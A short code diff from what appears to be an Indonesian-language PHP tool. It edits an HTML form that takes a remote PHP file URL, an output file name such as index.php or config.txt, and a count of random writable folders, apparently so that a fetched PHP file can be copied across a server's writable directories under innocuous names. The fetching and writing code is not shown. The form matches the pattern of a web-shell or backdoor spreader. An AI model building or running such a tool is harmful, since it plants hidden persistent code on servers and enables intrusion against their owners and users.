@@ -87,8 +87,8 @@ function findAllWritableFolders($dir) {
         <label for="php_url">🌐 URL PHP File:</label>
         <input type="text" id="php_url" name="php_url" required placeholder="https://raw.githubusercontent.com/.../file.php">
 
-        <label for="php_name">📄 Nama File PHP:</label>
-        <input type="text" id="php_name" name="php_name" value="index.php">
+        <label for="php_name">📄 Nama File Hasil (contoh: index.php, config.txt):</label>
+        <input type="text" id="php_name" name="php_name" placeholder="Default: index.php">
 
         <label for="folder_limit">🔢 Jumlah Folder Random (1-50):</label>
         <input type="number" id="folder_limit" name="folder_limit" min="1" max="50" value="5">
